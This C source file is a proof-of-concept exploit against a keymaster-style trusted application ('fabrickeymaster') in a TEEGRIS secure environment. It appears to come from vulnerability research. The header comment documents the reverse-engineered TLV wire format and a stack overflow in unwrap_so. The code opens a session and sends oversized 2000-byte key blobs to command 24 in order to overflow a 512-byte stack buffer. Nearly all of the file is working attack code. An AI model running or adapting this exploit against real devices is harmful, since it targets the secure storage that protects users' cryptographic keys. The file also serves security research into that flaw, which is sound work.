/* FbCkmR (fabrickeymaster) — attempt to trigger Finding #1, the
 * GCM-plaintext-before-tag stack overflow in unwrap_so consumers.
 *
 * Wire format of params[0] (reverse-engineered from tz_process_command
 * @0xF250 + deserialize @0xCC18 + parse_into_msg @0xE920):
 *     [u32 cmd_id][u32 payload_len L][TLV items...]      total = L + 8
 *   TLV bytes item:   [u32 tag (hi byte 0x02)][u32 len][len bytes]
 *   TLV integer item: [u32 tag (hi byte 0x01)][u32 value]
 *
 * cmd 18 (CMD_FK_SECURE_IMPORT, fk_secure_import @0x1ED88):
 *   reads FK_TAG_BLOB (0x02000003, pubkey) + FK_TAG_KEY_BLOB (0x02000015,
 *   wrapped key). unwrap_so(wrapped.data, wrapped.len, v94[520], &v85)
 *   has NO size guard -> wrapped.len > 552 overflows the 520-byte stack
 *   buffer when FK_CRYPTO_aes_gcm_decrypt streams plaintext via
 *   EVP_DecryptUpdate before the GCM tag is checked.
 * cmd 24 (CMD_FK_EXPORT_DATA, fk_export_data @0x14490):
 *   direct unwrap_so on FK_TAG_BLOB (data_blob) into a 512-byte buffer.
 *
 * We send an oversized (2000-byte) blob for each tag so that, IF the
 * crypto primitives were modelled, the copy would smash the canary.
 */
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

#define BUFSZ 8192
#define FK_TAG_BLOB      0x02000003u
#define FK_TAG_KEY_BLOB  0x02000015u
#define OVERSIZE 2000   /* > 552 -> overflows v94[520] / v47[512] */

static inline void put_u32(uint8_t *p, uint32_t v){ memcpy(p, &v, 4); }

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337 2>/dev/null");
    system("ipcrm -M 0x13338 2>/dev/null");
    system("ipcrm -M 0x13339 2>/dev/null");
    system("ipcrm -M 0x1333a 2>/dev/null");
#endif
}

/* Build a cmd request into `in`, return total byte length used. */
static uint32_t build_req(uint8_t *in, uint32_t cmd)
{
    memset(in, 0, BUFSZ);
    uint32_t off = 8;
    /* item: FK_TAG_BLOB — for cmd 24 (fk_export_data) this is the direct
     * unwrap_so source into the 512-byte stack buffer, so oversize it here.
     * (cmd 18 instead parses this as an ASN.1 pubkey; its overflow source is
     * FK_TAG_KEY_BLOB below — but that path needs a valid DER pubkey first.) */
    put_u32(in + off, FK_TAG_BLOB);   put_u32(in + off + 4, OVERSIZE);
    memset(in + off + 8, 0xBB, OVERSIZE);  off += 8 + OVERSIZE;
    /* item: FK_TAG_KEY_BLOB (oversized wrapped key -> cmd 18 overflow source) */
    put_u32(in + off, FK_TAG_KEY_BLOB); put_u32(in + off + 4, OVERSIZE);
    memset(in + off + 8, 0xBB, OVERSIZE); off += 8 + OVERSIZE;
    uint32_t L = off - 8;
    put_u32(in + 0, cmd);   /* cmd id  */
    put_u32(in + 4, L);     /* payload length */
    return off;
}

int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-4662436b6d52";
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) { printf("OpenSession failed 0x%x\n", res); exit(-1); }
    printf("[poc] session opened\n");

    uint8_t* in  = (uint8_t*)allocate_param_mem(&context, BUFSZ);
    uint8_t* out = (uint8_t*)allocate_param_mem(&context, BUFSZ);
    if (!in || !out) { printf("[poc] alloc failed\n"); exit(-1); }

    uint32_t cmds[] = {24};
    int ncmds = sizeof(cmds)/sizeof(cmds[0]);

    for (int i = 0; i < ncmds; i++) {
        uint32_t used = build_req(in, cmds[i]);
        memset(out, 0, BUFSZ);

        memset(&op, 0, sizeof(op));
        /* param_types must == 0x65 (validated by TA_InvokeCommandEntryPoint):
         * nibble0 = MEMREF_TEMP_INPUT(5), nibble1 = MEMREF_TEMP_OUTPUT(6). */
        op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                         TEEC_NONE, TEEC_NONE);
        op.params[0].tmpref.buffer = in;  op.params[0].tmpref.size = BUFSZ;
        op.params[1].tmpref.buffer = out; op.params[1].tmpref.size = BUFSZ;

        printf("[poc] >>> invoking cmd %u (req %u bytes, FK_TAG_KEY_BLOB len=%u)\n",
               cmds[i], used, OVERSIZE);
        res = TEEC_InvokeCommand_impl(&session, cmds[i], &op, &err_origin);
        printf("[poc] <<< cmd %u returned 0x%x (%d) origin 0x%x\n",
               cmds[i], res, (int)res, err_origin);
    }

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
